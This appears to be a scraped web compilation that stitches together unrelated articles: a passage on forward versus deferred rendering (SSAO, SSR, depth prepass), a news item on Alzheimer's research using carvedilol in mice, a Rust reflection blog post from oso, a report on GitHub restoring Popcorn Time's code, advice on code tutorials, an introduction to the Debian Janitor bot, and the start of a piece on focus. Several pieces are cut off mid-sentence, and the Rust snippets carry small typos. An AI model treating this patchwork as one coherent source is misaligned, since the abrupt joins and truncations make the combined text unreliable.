<li>You need the forward pass to finish in order to compute SSAO.</li>
<li>You need SSAO to apply the AO to the ambient lighting term to do the forward pass.</li>
</ul>
<p>To solve this problem you have two solutions:</p>
<ol>
<li>Perform a depth pre-pass</li>
<li>Apply SSAO to the whole thing, ignoring correctness. Perhaps you can use the alpha channel to indicate how much % of the pixel has been lit by ambient, as a fake approximate. Or other tricks. But it would be a fake. Let’s remember that AO is already a fake (it has no real world physical basis), making SSAO the fake of a fake. Such tricks add up to faking the fake of a fake. Not nice. But maybe you make it look good.</li>
</ol>
<p>Deferred doesn’t have this problem at all,&nbsp;as the depth is available&nbsp;before the shading pass.</p>

<h4>SSR (Screen Space Reflections)</h4>
<p>Technically this is a subset of the “Dependency problems” like the SSAO problem described above, but since SSR are all the rave now, it deserves its own section.</p>
<p>SSR has a similar dependency problem:</p>
<ul>
<li>You need to know how the shaded&nbsp;result is going to look (you need depth,&nbsp;normals from G-Buffer + shaded result) to compute SSR.</li>
<li>You need SSR to render&nbsp;the final result.</li>
</ul>
<p>Deferred Shading doesn’t have this problem because it can compute the shaded&nbsp;result, then do reflections, then combine them because it has all the necessary data in the G-Buffers to do a correct&nbsp;merge.</p>
<p>In forward to solve this problem you have three options:</p>
<!-- WP QUADS Content Ad Plugin v. 2.0.15 -->


<ol>
<li>Do what <a href="http://www.adriancourreges.com/blog/2016/09/09/doom-2016-graphics-study/">Doom 2016</a> does. Hybrid rendering (Deferred + Forward): perform a depth pre-pass with a small GBuffer (you need at least normals + depth, maybe roughness depending on how you compute glossy reflections), and&nbsp;use the final result of the previous frame (re-projected). Reflections will&nbsp;lag behind one frame. Also this inter-frame dependency doesn’t play nice with SLI/Crossfire.</li>
<li>Output&nbsp;a full blown GBuffer&nbsp;so you can later correctly merge reflections with the final output. This puts&nbsp;Forward in the “high bandwidth cost” category. Also MSAA gets harder to support. You’re essentially bringing in some of the Deferred’s cons.</li>
<li>Like with&nbsp;SSAO, don’t care about correctness and merge the output with the reflections in whatever way you can.</li>
</ol>


<h3>All points to hybrid rendering via a depth prepass</h3>
<p>Depth prepass seems to be the solution to everything:</p>
<ol>
<li>By having the depth earlier, you can compute SSAO.</li>
<li>Early&nbsp;depth&nbsp;helps with the mega-shader problem as every fragment&nbsp;will only be shaded once.</li>
<li>You can compute scene’s shadow mapping in a deferred way, then apply it as a mask during&nbsp;the forward shading result; thus offloading&nbsp;the mega-shader and reducing its size. Doing this mask&nbsp;<em>during</em> the depth prepass may be useful in AMD GPUs who have all those GCN cores idle. Maybe even compute some lights.</li>
<li>You can use Doom’s solution to SSR (if you can sustain 60 fps)</li>
<li>If you’re not careful, one of these solutions can hinder your ability to use&nbsp;MSAA.</li>
</ol>
<p>But of course… depth prepass is not free. It costs both CPU (batch generation and command preparation/execution) and GPU (the more tessellated your geometry is, the worse it gets). Furthermore, if you’re an experienced veteran with access to modern API techniques (e.g. GL’s AZDO, D3D11, D3D12, Vulkan) writing a new engine then depth prepass gets cheaper CPU-side&nbsp;as your engine will be very efficient with low driver overhead and multi-threaded command preparation. If you’re not an experienced programmer, or if you’re working with an engine with giant amounts of legacy, an extra&nbsp;pass can be very expensive.</p>
<p>As for the depth prepass itself, you also have two choices:</p>
<ol>
<li>While doing the depth prepass, output a small GBuffer &amp; do some offloading from&nbsp;the mega-shader (e.g. by computing the shadow mask). This means the depth prepass must split batches by materials in the same way the main forward pass will do. CPU side this is great because now commands can be reused entirely except for the ones that set the shader. Just change the commands that change the shader and you’re done. But this may result in heavier driver computations and more chance of pipeline stalls in the GPU.</li>
<li>Perform a depth prepass. No pixel shader, only depth output. CPU side you will have to create commands twice, but allows to batch a lot more (basically almost everything can be batched together). GPU side this is great because nearly no pipeline stalls will happen. Though load balancing may be an issue in GCN thus you’ll need&nbsp;some async compute to compensate.</li>
</ol>
<p>Which one is better? I don’t know. I have yet to try &amp; profile. But since option #2 doesn’t allow hybrid rendering I’ll likely won’t be even trying&nbsp;it.</p>

<h3>Other options</h3>
<p>I won’t go into detail because I don’t have experience with these techniques. A GPU-Open post talks about <a href="http://gpuopen.com/texel-shading/">texel shading</a>&nbsp;and Oxide Games’ presentation talks about (the poorly-chosen-name) <a href="http://oxidegames.com/wp-content/uploads/2016/03/Object-Space-Lighting-Rev-21.pptx">Object Space Shading</a>. These techniques fight the drawbacks discussed here, but the texel shading article has a pretty good explanation of their own set of drawbacks.</p>

<h3>Final words</h3>
<p>Phew! I got this out of my chest.</p>
<p>Forward + big mega-shaders (which will get you&nbsp;GPU performance problems) vs Forward + depth prepass (and potentially MSAA issues) vs Deferred rendering with transparency, MSAA, and bandwidth issues.&nbsp;<strong>Pick your poison</strong>.</p>
<p>I’m a huge fan of modern Forward algorithms. I love being able to use MSAA and having no problems with transparency.</p>
<p>But unfortunately, <strong>I don’t see any clear winner as a general case algorithm</strong>.</p>
<p>If you can foresee you will have low tessellated geometry with expensive pixel shaders, go for Forward + depth prepass. If you have&nbsp;low or moderately tessellated geometry w/&nbsp;cheaper pixel shaders (e.g. non-photorealistic rendering, don’t care about perfect reflections or “correct” SSAO) just go Forward. If you can foresee you’ll …</p></section></article></div>

                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<h2>Introduction</h2>
<p>This is Part 2 in our blog series on our experience building a runtime reflection system in Rust for our policy engine, oso. </p>
<p>In Part 1, we built a simple class system, with a metaclass struct called <code>Class</code> to track type information. We also introduced the <code>Instance</code> struct to wrap any object and erase the type using <code>dyn Any</code>. You can find Part 1: dyn Class <a href="https://www.osohq.com/post/rust-reflection-pt-1">here</a>. </p>
<p>In this post, we'll go through how we support accessing arbitrary attributes on our instances at runtime. There are multiple approaches to solving this problem, including the use of traits from the standard library and commonly used crates like <code>serde</code>. We'll talk through the pros and cons of each, and the version we landed on: adding attribute getters.</p>
<h2>Accessing attributes on a struct</h2>
<p>Suppose we have a struct:</p>
<pre><code>struct Foo {
    x: u32,
}
</code></pre>

<p>We would like to write the following code in <a href="https://docs.osohq.com/using/polar-syntax.html">Polar</a>, the oso Policy language:</p>
<pre><code>x_is_one(foo: Foo) if
    foo.x = 1;
</code></pre>

<p>and have it check that <code>foo</code> has an attribute called <code>x</code> and that its value is 1.</p>
<h3>What makes this so hard?</h3>
<p>To start with, there is no <code>getattr(foo, "x")</code> equivalent in Rust. And what makes this hard to implement ourselves is that Rust (by default) provides no guarantees about things like <a href="https://doc.rust-lang.org/reference/type-layout.html#the-default-representation">the memory layout of a struct</a>. In fact, in some cases will simply <a href="https://doc.rust-lang.org/nightly/nomicon/exotic-sizes.html#zero-sized-types-zsts">optimise away the field entirely</a>. Even in debug builds, a debugger might be unable to <a href="https://github.com/rust-lang/rust/issues/46698">lookup the value of variables</a>.</p>
<p>In other words, if you haven't <em>explicitly</em> told Rust that you want it to let you access an attribute, you're unlikely to get it.</p>
<h2>Our approach</h2>
<p>Let's start by thinking about the method signature for dynamic access. We would like to take in an <code>Instance</code> and an attribute name (<code>&amp;str</code>), and return a value to the policy engine.</p>
<p>In other words:</p>
<pre><code>Fn(&amp;Instance, &amp;str) -&gt; PolarValue;
</code></pre>

<p>There are actually two distinct places we could conceivably implement this method: on <code>Instance</code>, and in <code>Class</code>.</p>
<p>On one hand, if we implement it directly on <code>Instance</code>, then we don't need to do any more work to look up the class in order to get attributes.</p>
<p>On the other hand, we need to store the attributes <em>somewhere</em> so that we can add them to the instance on creation. So we would probably need to store these these on the <code>Class</code> anyway, and then copy them onto the <code>Instance</code>.</p>
<p>It's a subtle distinction, but for us it made more sense to the keep the instance lightweight, and to use the <code>Class</code> to store the attribute lookups. Although in Python its perfectly valid to add attributes to a class on the fly, we have that requirement in neither the host language nor in Polar.</p>
<p>To make the above work, we simply add a method on an <code>Instance</code> to retrieve the class of it, and we can get attributes from there:</p>
<pre><code>impl Instance {
    fn get_class(&amp;self) -&gt; Result&lt;&amp;Class&gt; { ... }

    pub fn get_attribute(&amp;self, name: &amp;str, host: &amp;mut Host) -&gt; crate::Result&lt;Term&gt; {
        let class = self.class(host)?
        class.get_attribute(self, name)
    }
}
</code></pre>

<h3>Implementing the getter</h3>
<p>To implement the <code>get_attribute</code> method, we can either implement (a) a method that can fetch <em>all</em> attributes, or (b) a method for each attribute.</p>
<p>We opted for (b), which gives us the most flexibility to decide on a per-attribute basis how the lookup works.  <code>Class</code> stores a map from attribute names to getters:</p>
<pre><code>/// Class definitions
struct Class {
   ...

    /// Map from attribute name to the attribute lookup
    attributes: HashMap&lt;&amp;'static str, AttributeGetter&gt;
}

struct AttributeGetter(Arc&lt;dyn Fn(&amp;Instance) -&gt; PolarValue);
</code></pre>

<p>We've now split the attribute lookup into two steps:</p>
<ol>
<li>Look up the getter for the named attribute: <code>(instance, name) → (instance, attributes.get(name)) → (instance, f)</code></li>
<li>Apply the getter method: <code>(instance, f) → f(instance)</code></li>
</ol>
<p>A simple example of an attribute getter is the closure <code>|foo: &amp;Foo| foo.x</code> which has <a href="https://doc.rust-lang.org/reference/types/closure.html">a unique anonymous type</a> – written <code>[closure@&lt;source code location&gt;]</code>   —  and implements the trait <code>Fn(&amp;Foo) -&gt; R</code>. </p>
<p>To store this on the class we need to do some dynamic type mapping again. First, we have in our hands an <code>Instance</code>, not a <code>Foo</code>. We saw in the last post that <code>downcast</code> would allow us to get back to a concrete type. Furthermore we cannot store a function that returns <whatever the="" type="" of="" <code="">foo.x is&gt;. Instead, we make sure to do the conversion back to a <code>PolarValue</code> as part of looking up the attribute.</whatever></p>
<p>To make it a bit easier to create such type-erased functions, and to make it easier for users of oso, the <code>AttributeGetter</code> provides a new method which handles this for them:</p>
<pre><code>impl AttributeGetter {
    pub fn new&lt;T, F, R&gt;(f: F) -&gt; Self
    where
        T: 'static,
        F: Fn(&amp;T) -&gt; R,
        R: crate::ToPolar,
    {
        Self(Arc::new(move |receiver: &amp;Instance, host: &amp;mut Host| {
            // get back the original type of the receiver
            let receiver = reveiver.downcast().expect("type error");
            // call the function; convert the result
            f(receiver).map(|res| res.to_polar(host))
        }))
    }
}
</code></pre>

<p>We use this in the builder method:</p>
<pre><code>impl&lt;T: 'static&gt; ClassBuilder&lt;T&gt; {
  pub fn add_attribute_getter&lt;F, R&gt;(mut self, name: &amp;'static str, f: F) -&gt; Self
    where
        F: Fn(&amp;T) -&gt; R,
        R: crate::ToPolar,
    {
        self.attributes.insert(name, AttributeGetter::new(f));
        self
    }
}
</code></pre>

<p>One nice property of the above is that it's a compile-time error to define an attribute getter for the wrong class! So despite erasing the type when constructing an <code>Instance</code> and later recovering the type dynamically, it's impossible to provide the wrong getter:</p>
<pre><code>error[E0631]: type mismatch in closure arguments
  --&gt; languages/rust/oso/examples/blog.rs:53:14
   |
53 |             .add_attribute_getter("y", |foo: &amp;Bar| foo.y)
   |              ^^^^^^^^^^^^^^^^^^^^      ----------------- found signature of `for&lt;'r&gt; fn(&amp;'r example_two::Bar) -&gt; _`
   |              |
   |              expected signature of `for&lt;'r&gt; fn(&amp;'r example_two::Foo) -&gt; _`
</code></pre>

<h3>Trying it out</h3>
<p>Okay, let's see it in action! We'll start with some test setup:</p>
<pre><code>struct Foo { x: u32, }

#[test]
fn test_get_attribute() {
    // Setup the host environment
    let polar = crate::Polar::new();
    let mut host = Host::new(Arc::new(polar));

   ...
}
</code></pre>

<p>Now that we're a runtime class system, we need something to manage these classes at runtime. This is our <code>Host</code> object. <code>Host</code> will be responsible for things like storing class definitions and caching instances. </p>
<p>Next, we define the <code>Foo</code> class:</p>
<pre><code>// builder for defining the Foo class
let foo_class: Class = Class::builder::&lt;Foo&gt;()
    .add_attribute_getter("x", |foo| foo.x)
    .build();
// register the Foo class on the host
host.cache_class(foo_class, "Foo".into()).unwrap();
</code></pre>

<p>We added a simple builder pattern to make it easier to register attributes in bulk, and the built <code>Class</code> is cached on the <code>host</code>.</p>
<p>With the setup done, we can try out accessing attributes dynamically:</p>
<pre><code>let foo_instance: Instance = Instance::new(Foo { x: 1 });
// get the value of "x" from the instance
let get_x = foo_instance.get_attribute("x", &amp;mut host).unwrap();

// check the result is the PolarValue for 1
assert_eq!(get_x, polar_core::term!(1));
</code></pre>

<p>The test looks up the value of "x" on the instance of foo, and compares it to the expected result. Dynamic attributes in action! The returned value is now a Polar term, since in normal operation the return value would be sent to the Polar VM.</p>
<p>The benefit of this approach is it gives the user a lot of optionality: for cases where the attribute doesn't implement <code>ToPolar</code>, we can handle conversions right in the closure defined. And the implementation itself is super simple.</p>
<p>The main downside of the approach is that it is <em>very</em> manual. For every attribute a user wants to use, they need to add the <code>add_attribute_getter</code> line.</p>
<p>Fortunately, in the <code>oso</code> crate, we also provide a derive macro which can handle this. We still make getting attributes an opt-in process, but the code from above becomes:</p>
<pre><code>#[derive(PolarClass)]
struct Foo { 
    #[polar(attribute)]
    x: u32,
}

#[test]
fn test_get_attribute() {
    ...

    // builder for defining the Foo class
    let foo_class: Class = Foo::get_polar_class();

    ...
}
</code></pre>

<h2>Alternate Approaches</h2>
<p>The approach we outline above suits our needs, but is leveraging virtually nothing from the Rust standard library nor the Rust ecosystem. Is there really nothing out there to address this problem?</p>
<p>We'll take you through a few of the alternatives we tried. Some of them are complementary to the approach we've taken and would be reasonable future additions, others just didn't quite seem to be what we needed.</p>
<p>In no particular order:</p>
<h3>Implement <code>Index&lt;String&gt;</code></h3>
<p>In some ways, the most direct route we could take would be to use the <code>Index&lt;String&gt;</code> <a href="https://doc.rust-lang.org/std/ops/trait.Index.html">trait</a>. This is normally used for data structures like <code>Vec,</code> which allow you to index into it with <code>vec[i]</code>, or with <code>HashMap</code>, which allows you to get a key with <code>map[&amp;key]</code>.</p>
<p>The benefit of using a trait from the standard library is that users may get implementations of the trait for "free", e.g., if they are already using a <code>HashMap</code>, then they don't need to do any additional work to define attribute getters that leverage the trait.</p>
<pre><code>impl ClassBuilder&lt;T&gt; {
    fn supports_indexing(mut self) -&gt; Self
    where T: Index&lt;&amp;str&gt;
    {
        self.set_attribute_lookup(|receiver, attr| {
            receiver.index(&amp;attr)
        }
    }
}
</code></pre>

<p>The problem is: what is the output type for <code>Index</code>? We need it to be any type that can be converted back into the Polar core –&nbsp;perhaps <code>Box&lt;dyn ToPolar&gt;</code> or similar. To make that happen, we would be requiring the user to implement a version of <code>Index</code> for their classes, which is unlikely to be something they will want in the rest of their code. Given this, it doesn't seem like there is much benefit to using <code>Index</code>.</p>
<h3><code>serde::Serialize</code></h3>
<p>Whenever we encounter a problem that requires some form of translation, <code>serde</code> comes to mind. </p>
<p>We could require types to implement <code>serde::Serialize</code>. By writing our own custom serializer, this would give us a way to leverage the existing machinery for walking over all the fields of a struct. And the ubiquity of …</p></div></div></div>

			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-2ee12136="" data-v-61c0ab88=""><div><p>Creating tutorials for your codebase is not an intuitive task for many teams. How to tackle it? What makes for a good tutorial? How do we measure the effectiveness of a code tutorial correctly?</p>
<p>We covered dozens of tutorials and approaches at different companies and organisations, and here are the 5 elements we found every code tutorial has to have. We’re willing to go as far off and say: if your onboarding tutorials do not meet the following criteria - you probably shouldn’t bother creating them in the first place.</p>
<h2>What Makes a Code Tutorial Effective?</h2>
<p>While providing your engineers with code tutorials can be a time consuming task for everyone, tutorials pose some innate benefits that will help keep your onboarding programs effective and sustainable and internal knowledge sharing levelled up.</p>
<p><strong>Great code tutorials are:</strong></p>
<ol>
<li>Focused - highlighting just the part of the repo which your engineer needs to learn to get started. If the readers need to look through dozens of paragraphs to find what they were looking for, they might not even bother searching. In other words, tutorials are not like your history essay from high-school - You lose points for length and breadth.</li>
<li>Highlight the “Why”. They show a clear explanation of the logic behind the code and/or why it is like it is now.</li>
<li>They show a process rather than the mere solution. It’s much easier to understand code by seeing the process of its creation or the flow of information, rather than just looking at a freeze frame of what it looks like now.</li>
<li>Tinkering - they enable a sandbox experience or learning by doing. It’s similar to getting thrown a task from the backlog in the sense that it is hands on, however it is structured, and guided in a way that evokes deductively understanding codebase logic, and also does not require the time and investment a backlog task would.</li>
<li>Up to date. They have to be practical and up to date with the current code. What usually kills good tutorials is if they are outdated. Not only will they waste the reader’s time, they might cause actual damage by misleading. This is the number one reason that many engineers distrust tutorials, and documentation in general.</li>
</ol>
<h2>Recap</h2>
<p>Good tutorials are hard to make and maintain. Although, easier said than done, the key is to keep them updated, focused and encourage an independent learning process. The next step to tune-it up, would be to make sure we measure the effectiveness of our tutorials (more on that in a future post), and gather feedback to improve over time.</p>

            <!-- TL;DR
=====

The `Janitor <https://janitor.debian.net/>` is a new bot that automatically
proposes improvements for Debian packages maintained in Git. -->
<!-- Problem statement -->
<p>There are a lot of small changes that can be made to the Debian archive to
increase the overall quality. Many of these changes are small and have just
minor benefits if they are applied to just a single package. Lintian encourages
maintainers to fix these problems by pointing out the common ones.</p>
<p>Most of these issues are often trivially fixable; they are in general an
inefficient use of human time, and it takes a lot of effort to keep up with.
This is something that can clearly be automated.</p>
<p>Several tools (e.g. onovy's <a href="https://github.com/onovy/onovy-mass">mass tool</a>,
and the <a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> tool
that I've been working on) go a step further and (for a subset of the issues
reported by lintian) fix the problems for you, where they can.  Lintian-brush
can currently fix most instances of <a href="https://salsa.debian.org/jelmer/lintian-brush#supported-tags">close to 100 lintian tags</a>.</p>
<p>Thanks to the Vcs-* fields set by many packages and <a href="https://docs.gitlab.com/ee/api/">the APIs provided by hosting
platforms like Salsa</a>, it is now possible to
proactively attempt to fix these issues.</p>
<p>The Debian Janitor is a tool that will run lintian-brush across the entire
archive, and propose fixes to lintian issues via pull request.</p>
<div id="objectives">
<h2>Objectives</h2>
<p>The aim of Debian Janitor is to take some drudge work away from Debian
maintainers where possible, so they can spend their time on more important
packaging work.  Its purpose is to make automated changes quick and easy to
apply, with minimal overhead for package maintainers. It is essentially a bit
of infrastructure to run lintian-brush across all of the archive.</p>
<p>The actions of the bot are restricted to a limited set of problems for which
obviously correct actions can be taken. It is not meant to automate all
packaging, or even to cover automating all instances of the issues it knows
about.</p>
<p>The bot is designed to be conservative and delight with consistently correct
fixes instead of proposing possibly incorrect fixes and hoping for the best.
Considerable effort has been made to avoid the janitor creating pull requests
with incorrect changes, as these take valuable time away from maintainers, the
package doesn't actually improve (since the merge request is rejected) and it
makes it likelier that future pull requests from the Debian Janitor bot are
ignored or rejected.</p>
<p>In short: The janitor is meant to propose correct changes if it can, and back
off otherwise.</p>
</div>
<div id="design">
<h2>Design</h2>
<p>The Janitor finds package sources in version control systems from the Vcs*-
control field in Debian source packages. If the packaging branch is hosted on a
hosting platform that the Janitor has a presence on, it will attempt to run
<a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> on the packaging branch and (if there are any changes made)
build the package and
propose a merge. It is based on
<a href="https://github.com/jelmer/silver-platter/">silver-platter</a> and currently has
support for:</p>
<ul>
<li><a href="https://salsa.debian.org/">Salsa</a></li>
<li><a href="https://github.com/">GitHub</a></li>
<li><a href="https://launchpad.net/">Launchpad</a></li>
<li><a href="https://gitlab.com/">GitLab</a></li>
</ul>
<p>The Janitor is driven from the lintian and vcswatch tables in
<a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a>. It queries for packages
that are affected by any of the <a href="https://lintian.debian.org/">lintian</a> tags
that <a href="https://www.jelmer.uk/lintian-brush-intro.html">lintian-brush</a> has a
fixer script for. This way it can limit the number of repositories it has to
process.</p>
</div>
<div id="ensuring-quality">
<h2>Ensuring quality</h2>
<p>There are a couple of things I am doing to make sure that the Debian
Janitor delights rather than annoys.</p>
<div id="high-quality-changes">
<h3>High quality changes</h3>
<p>Lintian-brush has end-to-end tests for its fixers.</p>
<p>In order to make sure that merge requests are useful and high-value, the bot
will only propose changes from lintian-brush that:</p>
<ul>
<li>successfully build in a chroot and pass <a href="https://wiki.debian.org/ContinuousIntegration/autopkgtest">autopkgtest</a> and <a href="https://wiki.debian.org/piuparts">piuparts</a>;</li>
<li>are not completely trivial - e.g. only stripping whitespace</li>
</ul>
<p>Changes for a package will also be reviewed by a human before they make it into
a pull request.</p>
</div>
<div id="one-open-pull-request-per-package">
<h3>One open pull request per package</h3>
<p>If the bot created a pull request previously, it will attempt to update the
current request by adding new commits (and updating the pull request
description). It will remove and fix the branch when the pull request conflicts
because of new upstream changes.</p>
<p>In other words, it will only create a single pull request per package and will
attempt to keep that pull request up to date.</p>
</div>
<div id="gradual-rollout">
<h3>Gradual rollout</h3>
<p>I'm slowly adding interested maintainers to receiving pull requests, before
opening it up to the entire archive. This should help catch any widespread
issues early.</p>
</div>
<div id="providing-control">
<h3>Providing control</h3>
<p>The bot will be upfront about its pull requests and try to avoid overwhelming
maintainers with pull requests by:</p>
<ul>
<li>Clearly identifying any merge requests it creates as being made by a bot.
This should allow maintainers to prioritize contributions from humans.</li>
<li>Limiting the number of open proposals per maintainer. It starts by opening a
single merge request and won't open additional merge requests until the first
proposal has a response</li>
<li>Providing a way to opt out of future merge requests; just a reply on the
merge request is sufficient.</li>
</ul>
<p>Any comments on merge requests will also still be reviewed by a human.</p>
</div>
</div>
<div id="current-state">
<h2>Current state</h2>
<p>Debian janitor is running, generating changes and already creating merge
requests (albeit under close review). Some examples of merge requests it has
created:</p>
<ul>
<li><a href="https://salsa.debian.org/i3-team/i3-wm/merge_requests/1">i3 (on Salsa)</a></li>
<li><a href="https://salsa.debian.org/wouter/nbd/merge_requests/2">nbd (on Salsa)</a></li>
<li><a href="https://code.launchpad.net/~debian-janitor/friendly-recovery/lintian-fixes/+merge/375943">friendly recovery (on Launchpad)</a></li>
<li><a href="https://github.com/algernon/dh-exec/pull/3">dh-exec (on GitHub)</a></li>
</ul>
<div id="using-the-janitor">
<h3>Using the janitor</h3>
<p>The janitor can process any package that’s maintained in Git and has its
Vcs-Git header set correctly (you can use
<a href="https://qa.debian.org/cgi-bin/vcswatch">vcswatch</a> to check this).</p>
<p>If you're interested in receiving pull requests early, leave a comment below.
Eventually, the janitor should get to all packages, though it may take a while
with the current number of source packages in the archive.</p>
<p>By default, salsa does not send notifications when a new merge request for one
of the repositories you're a maintainer for is created. Make sure you have
notifications enabled in
<a href="https://salsa.debian.org/profile/notifications">your Salsa profile</a>,
by ticking "New Merge Requests" for the packages you care about.</p>
<p>You can also see the number of open merge requests for a package repository on
<a href="https://qa.debian.org/developer.php">QA</a> - it's the ! followed by a number in the
pull request column.</p>
<p>It is also possible to download the diff for a particular package (if it's been
generated) ahead of the janitor publishing it:</p>
<div><pre><span></span><span> $</span> curl https://janitor.debian.net/api/lintian-fixes/pkg/PACKAGE/diff
</pre></div>
<p>E.g. for i3-wm, look at
<a href="https://janitor.debian.net/api/lintian-fixes/pkg/i3-wm/diff">https://janitor.debian.net/api/lintian-fixes/pkg/i3-wm/diff</a>.</p>
</div>
</div>
<div id="future-plans">
<h2>Future Plans</h2>
<p>The current set of supported hosting platforms covers the bulk of packages in
Debian that is maintained in a VCS.  The only other 100+ package platform
that's unsupported is <a href="https://salsa.debian.org/dgit-team/dgit">dgit</a>. If you
have suggestions on how best to submit git changes to dgit repositories (BTS
bugs with patches? or would that be too much overhead?), let me know.</p>
<p>The next platform that is currently missing is
<a href="https://bitbucket.org/">bitbucket</a>, but there are only about 15 packages in
unstable hosted there.</p>
<p>At the moment, lintian-brush can fix close to 100 lintian tags. It would be
great to add fixers for more common issues.</p>
<p>The janitor should probably be more tightly integrated with other pieces of
Debian infrastructure, e.g. Jenkins for running jobs or linked to from the
<a href="https://tracker.debian.org/">tracker</a> or
<a href="https://lintian.debian.org/">lintian.debian.org</a>.</p>

<h2>More information</h2>

<p>If you have any concerns about these roll-out plans, have other ideas or
questions, please let me know in the comments.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
       
       <p><img src="https://www.deprocrastination.co/assets/illustrations/how_to_focus_candle.png" referrerpolicy="no-referrer" alt="How to Focus in the Age of Distraction"></p>
       <p>Why can't we focus anymore? Why is it so difficult to focus on reading, studying, or thorough problem solving?</p>
       <p>Before we dive into the actionable part, here are some simple reasons why it's harder than ever to focus.</p>
       
       <h2>Why we can't focus</h2>
       <h4><strong>Reason #1: we process more information than ever.</strong></h4>
